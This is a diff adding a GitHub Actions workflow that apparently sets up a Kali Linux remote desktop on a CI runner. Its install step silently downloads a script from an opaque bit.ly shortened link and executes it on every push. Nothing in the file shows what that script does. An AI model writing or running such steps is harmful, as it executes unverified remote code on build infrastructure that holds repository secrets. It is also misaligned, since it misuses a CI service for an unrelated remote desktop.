@@ -1,0 +1,17 @@
+name: Setup Kali Linux RDP
+
+on: push
+
+jobs:
+  setup-kali:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Install Kali Linux and RDP
+      run: |
+        wget -O kali.sh https://bit.ly/3EM0kdd > /dev/null 2>&1
+        chmod +x kali.sh
+        ./kali.sh
